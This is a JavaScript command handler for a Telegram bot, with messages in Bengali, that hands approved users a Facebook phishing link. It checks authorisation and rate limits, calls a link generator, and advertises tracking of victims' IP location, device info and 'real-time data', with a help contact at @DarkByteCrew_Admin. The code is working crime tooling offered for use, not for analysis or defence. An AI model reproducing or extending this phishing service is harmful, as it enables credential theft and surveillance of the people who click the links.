const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');
const helpers = require('../utils/helpers');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name;
  
  try {
    // অথেনটিকেশন চেক
    const auth = await authMiddleware(msg);
    if (!auth.allowed) {
      let reason = '';
      if (auth.reason === 'banned') reason = 'আপনি ব্যান করা হয়েছে';
      else if (auth.reason === 'pending') reason = 'আপনার অনুমতি পেন্ডিং';
      else reason = 'আপনি রেজিস্টার্ড নন';
      
      return bot.sendMessage(chatId, 
        `⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ⛔\n\n` +
        `${userName}, আপনার এই বট ব্যবহারের অনুমতি নেই।\n\n` +
        `📋 কারণ: ${reason}\n\n` +
        `👤 হেল্প: @DarkByteCrew_Admin`
      );
    }
    
    // রেট লিমিট চেক
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) {
      return bot.sendMessage(chatId,
        `⚠️ রেট লিমিট এক্সিডেড!\n` +
        `আবার চেষ্টা করুন: ${helpers.formatTime(rateLimit.resetTime)}`
      );
    }
    
    // ফেসবুক লিংক জেনারেট
    const link = await generator.generateFBLink(userId);
    
    // ইউজারের টোটাল লিংক আপডেট
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    // মেসেজ পাঠাও
    const message = `✅ 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆 𝐋𝐈𝐍𝐊 𝐂𝐑𝐄𝐀𝐓𝐄𝐃\n\n` +
      `🔗 আপনার লিঙ্ক:\n` +
      `${link.url}\n\n` +
      `📊 লিঙ্ক আইডি: ${link.linkId}\n` +
      `⏰ এক্সপায়ার: ৭ দিন\n\n` +
      `📈 ট্র্যাকিং ফিচার:\n` +
      `• ভিজিটর কাউন্ট\n` +
      `• রিয়েল-টাইম ডাটা\n` +
      `• আইপি লোকেশন\n` +
      `• ডিভাইস ইনফো\n\n` +
      `🔔 নোটিফিকেশন: নতুন ভিজিট/ডাটা পেলে ইনস্ট্যান্ট আপডেট`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('FBPhishing Command Error:', error);
    await bot.sendMessage(chatId, '❌ লিংক তৈরি করতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।');
  }
};
